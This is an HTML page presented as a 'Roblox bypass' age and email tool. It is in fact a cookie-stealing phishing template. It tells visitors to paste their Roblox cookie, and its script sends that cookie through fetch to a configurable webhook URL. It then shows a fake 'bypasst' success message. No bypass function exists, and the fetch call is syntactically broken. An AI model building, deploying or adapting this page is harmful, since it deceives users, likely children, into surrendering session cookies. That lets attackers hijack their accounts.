<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <title>Roblox bypass tools</title>
  <style>
    /* ==== Base Styling ==== */
    * {
      box-sizing: border-box;
    }
    body {
      font-family: "Segoe UI", sans-serif;
      background: linear-gradient(135deg, #141e30, #243b55);
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: rgba(47, 49, 54, 0.95);
      padding: 30px;
      border-radius: 20px;
      width: 540px;
      box-shadow: 0 0 25px rgba(0, 0, 0, 0.6),
                  0 0 30px rgba(88, 101, 242, 0.4);
      animation: fadeIn 0.7s ease-in-out;
      border: 2px solid transparent;
      background-image: linear-gradient(135deg, #2f3136, #23272a),
                        linear-gradient(135deg, #5865f2, #43b581);
      background-origin: border-box;
      background-clip: padding-box, border-box;
    }
    @keyframes fadeIn {
      from {opacity: 0; transform: scale(0.95);}
      to {opacity: 1; transform: scale(1);}
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
      font-size: 26px;
      color: #7289da;
      letter-spacing: 1px;
      text-shadow: 0 0 8px #5865f299;
    }

    /* ==== Option Buttons ==== */
    .options {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 14px;
      margin-bottom: 22px;
    }
    .option {
      background: #4f545c;
      padding: 18px;
      border-radius: 14px;
      text-align: center;
      cursor: pointer;
      transition: all 0.25s ease;
      font-size: 22px;
      font-weight: bold;
      user-select: none;
      border: 2px solid transparent;
    }
    .option:hover {
      background: #5865f2;
      transform: translateY(-3px) scale(1.05);
      box-shadow: 0 0 12px #5865f299;
    }
    .option.active {
      background: #43b581;
      border-color: #2ecc71;
      box-shadow: 0 0 18px #2ecc71cc;
      transform: scale(1.1);
    }

    /* ==== Textbox ==== */
    textarea {
      width: 100%;
      height: 180px;
      padding: 14px;
      border-radius: 14px;
      border: 2px solid transparent;
      resize: none;
      margin-bottom: 22px;
      font-size: 15px;
      background: #202225;
      color: white;
      outline: none;
      transition: all 0.25s ease;
      background-image: linear-gradient(#202225, #2c2f33),
                        linear-gradient(135deg, #5865f2, #43b581);
      background-origin: border-box;
      background-clip: padding-box, border-box;
    }
    textarea:focus {
      box-shadow: 0 0 12px #5865f299;
      border-color: transparent;
    }

    /* ==== Button ==== */
    button {
      width: 100%;
      padding: 16px;
      border: none;
      border-radius: 14px;
      background: linear-gradient(135deg, #5865f2, #4752c4);
      color: white;
      font-size: 17px;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.25s ease;
      box-shadow: 0 0 12px rgba(0,0,0,0.4);
    }
    button:hover {
      background: linear-gradient(135deg, #6d7ff7, #5865f2);
      transform: translateY(-3px);
      box-shadow: 0 6px 20px rgba(88,101,242,0.5);
    }
    button:active {
      transform: scale(0.97);
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>üöÄ Webhook Tool</h2>
    <div class="options" id="options">
      <div class="option">bypass email [all birthyears]</div>
      <div class="option">+ 13 to -13 All ages</div>
      <div class="option">coming soon...</div>
      <div class="option">coming soon...</div>
    </div>
    <textarea id="message" placeholder="paste your cookie there"></textarea>
    <button id="sendBtn">‚ñ∂Ô∏è Start</button>
  </div>

  <script>
    const webhookUrl = "YOUR_WEBHOOK_URL_HERE"; // <-- deine URL hier
    let selectedOption = null;

    // Option ausw√§hlen
    document.querySelectorAll(".option").forEach(opt => {
      opt.addEventListener("click", () => {
        document.querySelectorAll(".option").forEach(o => o.classList.remove("active"));
        opt.classList.add("active");
        selectedOption = opt.textContent;
      });
    });

    // Nachricht senden
    document.getElementById("sendBtn").addEventListener("click", async () => {
      const msg = document.getElementById("message").value;

      if (!msg) {
        alert("‚ùå paste the cookie first");
        return;
      }
      if (!selectedOption) {
        alert("‚ùå invaled ");
        return;
      }

      try {
        const response = await fetch(webhookUrl, {

            content: `${selectedOption} ${msg}`
          }),
        });

        if (!response.ok) throw new Error("HTTP " + response.status);
        alert("‚úÖ bypasst");
      } catch (err) {
        alert("‚ö†Ô∏è wrong cookie " + err.message + "\n\n ur cookie is dead");
      }
    });
  </script>
</body>
</html>
